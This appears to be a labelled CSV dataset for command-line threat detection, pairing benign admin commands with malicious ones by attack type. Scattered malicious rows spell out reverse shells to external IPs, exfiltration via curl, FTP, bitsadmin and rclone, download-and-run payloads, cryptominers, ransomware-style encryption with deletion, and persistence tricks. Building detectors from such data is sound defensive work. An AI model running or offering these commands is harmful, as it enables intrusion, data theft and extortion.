process_name,command_line,label,attack_type
sqlpackage,sqlpackage /Action:Export /SourceServerName:node12 /SourceDatabaseName:design_spec /TargetFile:X:\dac\design_spec.bacpac (user: MSSQLSERVER),benign,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.13.5 && systemctl enable vendor-agent,benign,persistence
python3,python3 -m http.server 5985 --directory /srv/artifacts/archive_set --bind 10.17.251.136,benign,reverse_shell
tar,tar -czf /srv/backups/nightly/archive_set-5.19.6.tar.gz /var/opt/sccm/packages/distribution --exclude='*.tmp',benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\session_blob /v Version /t REG_SZ /d 4.7.6 /f,benign,persistence
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db03\sccm$\manifest-0.4.1.msi /qn""",benign,privilege_escalation
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\db017fe1d49251966df6c960085d39c9 -FilePath C:\Backups\certs\manifest.cer,benign,credential_dumping
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.24.194.38:9091/metrics/job/telemetry_batch -H 'Content-Type: application/json',benign,data_exfiltration
scp,scp -P 443 -r /opt/vendor/pkg/cache/objects sysadmin@45.73.14.183:/tmp/00eaa139b1c6/,malicious,data_exfiltration
openssl,openssl enc -aes-256-cbc -salt -in /usr/local/share/pipeline/artifacts/build/archive_set.db -out /usr/local/share/pipeline/artifacts/build/archive_set.db.locked -k 244f9cc0ced252b41915e38ecc283fc3,malicious,ransomware
ssh,ssh -tt -i /etc/ci/deploy_key admin@cache09.prod.svc.cluster.local 'sudo systemctl restart design_spec',benign,reverse_shell
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.6.4 && systemctl enable vendor-agent,benign,persistence
gpg,gpg --batch --yes --recipient backups@internal.acme.io -e -o /srv/backups/dataset_part.gpg /usr/local/share/pipeline/artifacts/build/dataset_part.tar,benign,ransomware
systemctl,systemctl enable --now /etc/systemd/system/dacbb0e8d63c24c710145c487d943a75.service,malicious,persistence
sqlpackage,sqlpackage /Action:Export /SourceServerName:edge03 /SourceDatabaseName:report_final /TargetFile:X:\dac\report_final.bacpac (user: MSSQLSERVER),benign,sql_exploitation
ssh,ssh -N -L 5986:localhost:5432 build@build10.internal.acme.io,benign,reverse_shell
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/customer_db-6.6.4.dump warehouse,benign,ransomware
pg_dump,pg_dump -h 10.27.157.197 -U ansible -Fc -f /srv/backups/db/report_final-4.13.4.dump --no-password customers,benign,credential_dumping
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\manifest /v Version /t REG_SZ /d 4.26.0 /f,benign,persistence
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\dataset_part /v Version /t REG_SZ /d 1.14.5 /f,benign,persistence
mosh,mosh --ssh='ssh -i /etc/ci/key' mssql@worker02.corp.local -- tmux attach -t deploy,benign,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-5.26.2.reg /y,benign,credential_dumping
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.8.1 && systemctl enable vendor-agent,benign,persistence
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /data/warehouse/staging/landing/raw -Dest \\app08\backups$ -Retain 51,benign,ransomware
7z,7z a -mx=9 -ms=on /srv/backups/archive/payroll-1.7.4.7z /opt/vendor/pkg/cache/objects -xr!node_modules,benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\report_final /v Version /t REG_SZ /d 3.32.9 /f,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=3.16.4 && systemctl enable vendor-agent,benign,persistence
psexec.exe,"psexec.exe \\10.25.157.194 -u automation -p 98130b7e11a0ae4c -d cmd /c ""powershell -nop -w hidden -enc PGRvd25sb2FkZXItc3R1Yi1tYXJrZXI+""",malicious,lateral_movement
pg_dump,pg_dump -h 10.34.129.226 -U postgres -Fc -j 4 -f /srv/backups/db/telemetry_batch-0.29.3.dump analytics (user: postgres),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db02\sccm$\session_blob-8.35.8.msi /qn""",benign,privilege_escalation
chown,chown -R build:build /opt/app/releases/6.5.9 && chmod -R 750 /opt/app/releases/6.5.9,benign,privilege_escalation
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance node03 -Database session_blob -BackupFile 'X:\backups\session_blob-2.1.0.bak' (user: MSSQLSERVER),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/snapshot-0.36.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
restic,restic -r s3:s3.amazonaws.com/acme-backups backup C:\ProgramData\Vendor\Telemetry\spool --tag exfil-test --limit-upload 50000,benign,data_exfiltration
xmrig,xmrig --url 185.122.191.51:5985 --user 1a016804a4a872530498e94ddfe08493 --coin monero --donate-level 1 --background --no-color,malicious,crypto_miner
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 4.7.4"" dir=in action=allow protocol=TCP localport=4444",benign,defense_evasion
ansible-pull,"ansible-pull -U git@cache02.corp.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
scp,scp -C -i /etc/ci/key /srv/backups/db/dataset_part-8.20.6.dump backup@worker02.internal.acme.io:/srv/offsite/,benign,data_exfiltration
bash,"bash -c ""systemctl --user enable manifest.service && loginctl enable-linger admin""",benign,persistence
python3,"python3 -c 'while True: pass' (8 procs pinned, parent: /tmp/.73e4629974e50c16)",malicious,crypto_miner
sqlcmd,sqlcmd -S 10.39.213.241 -E -i C:\Maintenance\reindex-design_spec.sql -o C:\Logs\reindex-83.log (user: MSSQLSERVER),benign,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=0.0.3 && systemctl enable vendor-agent,benign,persistence
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 8.16.4"" dir=in action=allow protocol=TCP localport=31337",benign,defense_evasion
scp,scp -i /etc/ci/deploy_key build/payroll-2.5.6.tar.gz automation@build02.internal.acme.io:/opt/app/releases/,benign,lateral_movement
curl,curl -s -X POST -T /tmp/.2bc73e93c9877ed8/ledger_2024.tar.gz http://193.107.57.228:31337/upload,malicious,data_exfiltration
sqlcmd,sqlcmd -S 10.17.251.136 -E -i C:\Maintenance\reindex-manifest.sql -o C:\Logs\reindex-43.log (user: MSSQLSERVER),benign,sql_exploitation
ldapsearch,"ldapsearch -x -H ldap://ci01.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
psql,psql -h 10.39.141.197 -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres),benign,sql_exploitation
rsync,rsync -aHAX --delete --partial /mnt/storage/shares/department/legal/ /srv/backups/incremental/web02/,benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\dataset_part /v Version /t REG_SZ /d 3.3.6 /f,benign,persistence
ffmpeg,ffmpeg -i /srv/media/archive_set.mov -c:v libx264 -preset slow -crf 18 -threads 25 /srv/media/out/archive_set.mp4,benign,crypto_miner
tar,tar -czf /srv/backups/nightly/ledger_2024-2.37.2.tar.gz /srv/backups/nightly/incremental --exclude='*.tmp',benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 9.38.1 /f,benign,persistence
sqlpackage,sqlpackage /Action:Export /SourceServerName:build03 /SourceDatabaseName:ledger_2024 /TargetFile:X:\dac\ledger_2024.bacpac (user: MSSQLSERVER),benign,sql_exploitation
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\telemetry_batch' -ExclusionExtension '.tmp' (approved CR-41),benign,defense_evasion
gpg,gpg --batch --yes --passphrase cfd4a43ca8e4d035 -c /usr/local/share/pipeline/artifacts/build/report_final.xlsx && shred -u /usr/local/share/pipeline/artifacts/build/report_final.xlsx,malicious,ransomware
socat,"socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.25.157.194:5432",benign,reverse_shell
sqlpackage,sqlpackage /Action:Export /SourceServerName:app10 /SourceDatabaseName:snapshot /TargetFile:X:\dac\snapshot.bacpac (user: MSSQLSERVER),benign,sql_exploitation
zfs,zfs snapshot tank/data/ci03@nightly-053,benign,ransomware
hashcat,"hashcat -b -m 0 -D 1 --quiet (benchmark only, QA validation node ci06)",benign,crypto_miner
chown,chown -R postgres:postgres /opt/app/releases/3.6.6 && chmod -R 750 /opt/app/releases/3.6.6,benign,privilege_escalation
python3,python3 -m http.server 443 --directory /srv/artifacts/design_spec --bind 10.22.134.185,benign,reverse_shell
tmux,"tmux new-session -d -s deploy 'ssh www-data@web02 ""journalctl -u report_final -f""'",benign,reverse_shell
pg_dump,pg_dump -h 10.30.200.158 -U sysadmin -Fc -f /srv/backups/db/report_final-3.15.8.dump --no-password customers,benign,credential_dumping
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.10.2"" dir=in action=allow protocol=TCP localport=53",benign,defense_evasion
tmux,"tmux new-session -d -s deploy 'ssh postgres@ci03 ""journalctl -u snapshot -f""'",benign,reverse_shell
sshd,sshd --algo rx/0 -o 91.159.105.43:53 -u 421bbb44f3c9 --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 7.15.1 /f,benign,persistence
tmux,"tmux new-session -d -s deploy 'ssh jenkins@worker05 ""journalctl -u session_blob -f""'",benign,reverse_shell
ansible-pull,"ansible-pull -U git@node01.corp.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
pdsh,pdsh -w cache11[01-12] 'yum update -y --security && needs-restarting -r',benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.15.7 && systemctl enable vendor-agent,benign,persistence
filebeat,filebeat -e -c /etc/filebeat/filebeat.yml --path.data /var/lib/filebeat/dataset_part,benign,data_exfiltration
fluent-bit,fluent-bit -i tail -p path=/var/log/design_spec/*.log -o forward -p host=10.30.200.158 -p port=24224,benign,data_exfiltration
nc,nc -z -w2 10.37.84.200 9001 && echo 'port 9001 open on 10.37.84.200',benign,reverse_shell
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/session_blob/2.15.5/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
certutil.exe,certutil.exe -store My 9a278baeacf6,benign,credential_dumping
tmux,"tmux new-session -d -s deploy 'ssh www-data@node11 ""journalctl -u dataset_part -f""'",benign,reverse_shell
kubectl,kubectl cp production/audit_trail-3236fcea7a92:/var/log/app /tmp/diag/audit_trail -c app,benign,data_exfiltration
chown,chown -R automation:automation /opt/app/releases/0.35.5 && chmod -R 750 /opt/app/releases/0.35.5,benign,privilege_escalation
powershell.exe,powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Vendor' -Name LogLevel -Value 2 (CR-92),benign,defense_evasion
bash,bash -c 'exec 5<>/dev/tcp/91.225.121.70/31337; cat <&5 | while read l; do $l 2>&5 >&5; done',malicious,reverse_shell
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\manifest /v Version /t REG_SZ /d 9.37.8 /f,benign,persistence
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-8.36.9.wfw,benign,defense_evasion
expect,expect -f /opt/automation/rotate-router-edge09.exp,benign,reverse_shell
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 9.26.7 /f,benign,persistence
pg_dump,pg_dump -h 10.15.197.210 -U postgres -Fc -j 4 -f /srv/backups/db/ledger_2024-9.23.1.dump analytics (user: postgres),benign,sql_exploitation
kubectl,kubectl cp production/manifest-a05b68c5ddc3:/var/log/app /tmp/diag/manifest -c app,benign,data_exfiltration
sc.exe,sc.exe config BackupSvc start= auto (corporate baseline GPO c54f4e9fe78dd5f24d0505dfa009ba41),benign,defense_evasion
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/ledger_2024/3.13.4/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
chown,chown -R release:release /opt/app/releases/9.26.9 && chmod -R 750 /opt/app/releases/9.26.9,benign,privilege_escalation
azcopy,azcopy copy '/usr/local/share/pipeline/artifacts/build' 'https://acme.blob.core.windows.net/backups/payroll?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.3.1 && systemctl enable vendor-agent,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.5.2 && systemctl enable vendor-agent,benign,persistence
bash,bash -i >& /dev/tcp/5.76.143.83/8443 0>&1,malicious,reverse_shell
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=VendorAgent -r:http://node11:5985,benign,lateral_movement
docker,docker run --rm --cpus 16 buildkit:latest build --tag report_final:4.27.6 /workspace,benign,crypto_miner
terraform,terraform apply -auto-approve -target=module.cluster.node.ci03 -var image_version=3.8.7,benign,lateral_movement
tmux,"tmux new-session -d -s deploy 'ssh www-data@worker08 ""journalctl -u session_blob -f""'",benign,reverse_shell
sqlpackage,sqlpackage /Action:Export /SourceServerName:web04 /SourceDatabaseName:payroll /TargetFile:X:\dac\payroll.bacpac (user: MSSQLSERVER),benign,sql_exploitation
nc,nc -z -w2 10.0.153.163 8080 && echo 'port 8080 open on 10.0.153.163',benign,reverse_shell
wmic.exe,"wmic.exe /node:10.39.187.148 /user:automation process call create ""cmd /c certutil -urlcache -f http://185.234.104.149/8017e017d214b1f5 %TEMP%\8017e017d214b1f5""",malicious,lateral_movement
wget,wget -qO /tmp/.9c1e8fda974f9d0eadcbf2f83fab17ed http://5.237.97.189/9c1e8fda974f9d0eadcbf2f83fab17ed && /tmp/.9c1e8fda974f9d0eadcbf2f83fab17ed (parent: mysqld),malicious,sql_exploitation
pg_dump,pg_dump -h 10.39.213.241 -U build -Fc -f /srv/backups/db/customer_db-8.14.8.dump --no-password customers,benign,credential_dumping
sqlcmd,sqlcmd -S 10.22.60.119 -E -i C:\Maintenance\reindex-report_final.sql -o C:\Logs\reindex-24.log (user: MSSQLSERVER),benign,sql_exploitation
openssl,tar cz /data/warehouse/staging/landing/raw | openssl enc -aes-256-cbc -k bdeca475c013 | curl -s --data-binary @- http://185.218.142.120/u,malicious,data_exfiltration
kubectl,kubectl cp production/manifest-a799a9ca51c3:/var/log/app /tmp/diag/manifest -c app,benign,data_exfiltration
pg_basebackup,pg_basebackup -h 10.40.236.90 -U replicator -D /var/lib/postgresql/standby -Fp -Xs -P (user: postgres),benign,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName web04 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 0.4.7,benign,lateral_movement
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\svc07\sccm$\archive_set-7.19.9.msi /qn""",benign,privilege_escalation
sqlpackage,sqlpackage /Action:Export /SourceServerName:web05 /SourceDatabaseName:payroll /TargetFile:X:\dac\payroll.bacpac (user: MSSQLSERVER),benign,sql_exploitation
scp,scp -C -i /etc/ci/key /srv/backups/db/snapshot-2.30.7.dump backup@app06.ad.example.com:/srv/offsite/,benign,data_exfiltration
docker,docker run --rm --cpus 51 buildkit:latest build --tag dataset_part:5.3.6 /workspace,benign,crypto_miner
pg_dump,pg_dump -h 10.40.236.90 -U postgres -Fc -f /srv/backups/db/report_final-5.27.1.dump --no-password customers,benign,credential_dumping
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/dataset_part-6.3.9.dump warehouse,benign,ransomware
dpkg,dpkg -i /opt/packages/dataset_part-6.28.8_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
ssh,ssh -N -L 2222:localhost:5432 admin@svc04.internal.acme.io,benign,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\session_blob C:\Backups\reg\session_blob-1.31.8.reg /y,benign,credential_dumping
docker,docker run --rm --cpus 9 buildkit:latest build --tag dataset_part:8.25.1 /workspace,benign,crypto_miner
mkfifo,mkfifo /tmp/.8ae097fc3b1078e9e50aec17f5f895f9;cat /tmp/.8ae097fc3b1078e9e50aec17f5f895f9|/bin/sh -i 2>&1|nc 45.102.251.11 5985 >/tmp/.8ae097fc3b1078e9e50aec17f5f895f9,malicious,reverse_shell
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/manifest-1.14.8.dump warehouse,benign,ransomware
make,make -j8 all && make -j8 test (CI build farm node svc10),benign,crypto_miner
salt,"salt 'app07*' state.apply webserver pillar='{""release"": ""9.33.1""}'",benign,lateral_movement
powershell.exe,powershell.exe Start-Process cmd -Verb RunAs -ArgumentList '/c C:\Temp\4b8258d8d0d6.exe' (UAC bypass),malicious,privilege_escalation
ldapsearch,"ldapsearch -x -H ldap://worker03.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=Dnscache -r:http://worker03:5985,benign,lateral_movement
sc.exe,"sc.exe \\10.16.102.142 create VendorAgent binPath= ""cmd /c C:\Windows\Temp\dacbb0e8d63c24c710145c487d943a75.exe"" start= auto",malicious,lateral_movement
ssh,"ssh -i /etc/ci/deploy_key deploy@build02.prod.svc.cluster.local 'sudo systemctl restart dataset_part && sudo journalctl -u dataset_part --since ""1 min ago""'",benign,lateral_movement
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /var/opt/sccm/packages/distribution -Dest \\app03\backups$ -Retain 50,benign,ransomware
chown,chown -R www-data:www-data /opt/app/releases/3.3.4 && chmod -R 750 /opt/app/releases/3.3.4,benign,privilege_escalation
tmux,"tmux new-session -d -s deploy 'ssh build@db05 ""journalctl -u report_final -f""'",benign,reverse_shell
dpkg,dpkg -i /opt/packages/ledger_2024-1.24.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
fluent-bit,fluent-bit -i tail -p path=/var/log/ledger_2024/*.log -o forward -p host=10.27.129.42 -p port=24224,benign,data_exfiltration
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\svc05\sccm$\archive_set-1.3.7.msi /qn""",benign,privilege_escalation
bitsadmin.exe,bitsadmin.exe /transfer x /upload http://91.118.252.151/u C:\Temp\97bf4fd3b1ee.zip,malicious,data_exfiltration
azcopy,azcopy copy '/home/svc_backup/Documents/Finance/Q3' 'https://acme.blob.core.windows.net/backups/report_final?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-payroll.rman log=/var/log/rman-75.log (user: oracle),benign,sql_exploitation
ffmpeg,ffmpeg -i /srv/media/design_spec.mov -c:v libx264 -preset slow -crf 18 -threads 2 /srv/media/out/design_spec.mp4,benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:svc08 /SourceDatabaseName:archive_set /TargetFile:X:\dac\archive_set.bacpac (user: MSSQLSERVER),benign,sql_exploitation
ssh,ssh -tt -i /etc/ci/deploy_key postgres@build10.ad.example.com 'sudo systemctl restart customer_db',benign,reverse_shell
sc.exe,sc.exe config TermService start= auto (corporate baseline GPO 98130b7e11a0ae4c),benign,defense_evasion
pg_dump,pg_dump -h 10.22.21.112 -U admin -Fc -f /srv/backups/db/snapshot-6.19.6.dump --no-password customers,benign,credential_dumping
sccm,ccmexec.exe /deploy /package:telemetry_batch-4.9.1 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance cache03 -Database payroll -BackupFile 'X:\backups\payroll-8.31.0.bak' (user: MSSQLSERVER),benign,sql_exploitation
sqlcmd,sqlcmd -S 10.39.141.197 -E -i C:\Maintenance\reindex-telemetry_batch.sql -o C:\Logs\reindex-77.log (user: MSSQLSERVER),benign,sql_exploitation
mosh,mosh --ssh='ssh -i /etc/ci/key' www-data@svc03.corp.local -- tmux attach -t deploy,benign,reverse_shell
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.5.6 && systemctl enable vendor-agent,benign,persistence
mosh,mosh --ssh='ssh -i /etc/ci/key' ops@svc04.ad.example.com -- tmux attach -t deploy,benign,reverse_shell
7z,7z a -p883354bd434cbd092cce03174720110a -mhe=on -sdel /tmp/.883354bd434cbd092cce03174720110a/audit_trail.7z /usr/local/share/pipeline/artifacts/build,malicious,ransomware
powershell.exe,powershell.exe Invoke-Command -ComputerName db09 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 8.38.4,benign,lateral_movement
sccm,ccmexec.exe /deploy /package:snapshot-7.39.3 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
ssh,ssh -tt -i /etc/ci/deploy_key sysadmin@app06.corp.local 'sudo systemctl restart payroll',benign,reverse_shell
xmrig,xmrig --url 193.141.164.135:31337 --user 1ef0f55b791d3ce4bb8e85e63dc841bf --coin monero --donate-level 1 --background --no-color,malicious,crypto_miner
ssh,ssh -tt -i /etc/ci/deploy_key deploy@web02.eng.example.net 'sudo systemctl restart design_spec',benign,reverse_shell
sc.exe,sc.exe config Schedule start= auto (corporate baseline GPO 6be137b4fffe),benign,defense_evasion
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\payroll' -ExclusionExtension '.tmp' (approved CR-82),benign,defense_evasion
mosh,mosh --ssh='ssh -i /etc/ci/key' svc_backup@edge11.eng.example.net -- tmux attach -t deploy,benign,reverse_shell
ssh,"ssh -i /etc/ci/deploy_key svc_backup@worker04.corp.local 'sudo systemctl restart audit_trail && sudo journalctl -u audit_trail --since ""1 min ago""'",benign,lateral_movement
terraform,terraform apply -auto-approve -target=module.cluster.node.build07 -var image_version=2.37.4,benign,lateral_movement
fluent-bit,fluent-bit -i tail -p path=/var/log/design_spec/*.log -o forward -p host=10.39.187.148 -p port=24224,benign,data_exfiltration
blender,blender -b /srv/render/report_final.blend -o /srv/render/out/ -F PNG -x 1 -f 11 -- --cycles-device CPU,benign,crypto_miner
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.36.5 && systemctl enable vendor-agent,benign,persistence
dpkg,dpkg -i /opt/packages/archive_set-3.23.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\dataset_part' -ExclusionExtension '.tmp' (approved CR-52),benign,defense_evasion
ansible-pull,"ansible-pull -U git@ci03.prod.svc.cluster.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
gpg,gpg --batch --yes --recipient backups@corp.local -e -o /srv/backups/dataset_part.gpg /data/warehouse/staging/landing/raw/dataset_part.tar,benign,ransomware
ldapsearch,"ldapsearch -x -H ldap://db09.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\edge06\sccm$\archive_set-2.3.7.msi /qn""",benign,privilege_escalation
tar,tar czf - /data/warehouse/staging/landing/raw | curl -s -T - ftp://185.141.239.31/incoming/a05b68c5ddc3.tgz --user sysadmin:a05b68c5ddc3,malicious,data_exfiltration
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-worker12.html,benign,defense_evasion
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.31.108.93:9091/metrics/job/telemetry_batch -H 'Content-Type: application/json',benign,data_exfiltration
bash,"bash -c ""cp /tmp/.cfd4a43ca8e4d035/agent ~/.config/autostart/cfd4a43ca8e4d035.desktop""",malicious,persistence
terraform,terraform apply -auto-approve -target=module.cluster.node.ci09 -var image_version=3.21.5,benign,lateral_movement
sqlcmd,sqlcmd -S 10.27.204.232 -E -i C:\Maintenance\reindex-archive_set.sql -o C:\Logs\reindex-76.log (user: MSSQLSERVER),benign,sql_exploitation
sysbench,sysbench cpu --cpu-max-prime=20000 --threads=56 --time=300 run,benign,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\ledger_2024 /v Version /t REG_SZ /d 7.1.9 /f,benign,persistence
powershell.exe,powershell.exe Register-ScheduledTask -TaskName OneDriveStandalone -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'C:\Temp\632196f863074b23.exe'),malicious,persistence
sc.exe,"sc.exe \\10.18.79.16 create VendorAgent binPath= ""cmd /c C:\Windows\Temp\7123154cab37edd9.exe"" start= auto",malicious,lateral_movement
openssl,openssl speed -multi 16 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
tar,tar -czf /srv/backups/nightly/manifest-6.8.9.tar.gz /home/www-data/Documents/Finance/Q4 --exclude='*.tmp',benign,ransomware
scp,scp -C -i /etc/ci/key /srv/backups/db/report_final-5.4.4.dump backup@worker12.prod.svc.cluster.local:/srv/offsite/,benign,data_exfiltration
salt,"salt 'svc02*' state.apply webserver pillar='{""release"": ""5.30.3""}'",benign,lateral_movement
openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:0c2273ecfd564271,benign,credential_dumping
rclone,rclone copy /var/opt/sccm/packages/distribution mega:/exfil/a4a2fd64d2c3 --transfers 16 --ignore-existing -q,malicious,data_exfiltration
sqlpackage,sqlpackage /Action:Export /SourceServerName:worker12 /SourceDatabaseName:ledger_2024 /TargetFile:X:\dac\ledger_2024.bacpac (user: MSSQLSERVER),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/customer_db-2.29.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
cron,echo '*/15 * * * * release /opt/monitoring/collect-metrics.sh --push gateway://10.0.153.163:9091' > /etc/cron.d/metrics,benign,persistence
rsync,rsync -aHAX --delete --partial /var/lib/app/customer/exports/ /srv/backups/incremental/edge04/,benign,ransomware
tar,tar czf - C:\ProgramData\Vendor\Telemetry\spool | curl -s -T - ftp://193.48.112.7/incoming/cfd4a43ca8e4d035.tgz --user release:cfd4a43ca8e4d035,malicious,data_exfiltration
nohup,nohup /dev/shm/.a05b68c5ddc3 --coin monero --url 5.237.97.189:5985 --tls --rig-id worker01 &,malicious,crypto_miner
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\dfb024707c175857 -FilePath C:\Backups\certs\manifest.cer,benign,credential_dumping
zfs,zfs snapshot tank/data/app04@nightly-466,benign,ransomware
psql,psql -h 10.24.35.55 -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres),benign,sql_exploitation
bash,"bash -c ""echo '@reboot postgres /tmp/.1b72589478962291/run.sh' >> /etc/cron.d/1b72589478962291""",malicious,persistence
sccm,ccmexec.exe /deploy /package:archive_set-9.9.8 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
wmic.exe,"wmic.exe /namespace:\\root\subscription PATH __EventConsumer CREATE Name='AdobeGCInvoker', CommandLineTemplate='C:\Temp\5f0263ed0556.exe'",malicious,persistence
openssl,openssl enc -aes-256-cbc -salt -in /mnt/storage/shares/department/legal/ledger_2024.db -out /mnt/storage/shares/department/legal/ledger_2024.db.locked -k 1030a83b7884,malicious,ransomware
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit worker05 --tags deploy --extra-vars 'version=2.31.8',benign,lateral_movement
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\worker09\sccm$\archive_set-6.8.3.msi /qn""",benign,privilege_escalation
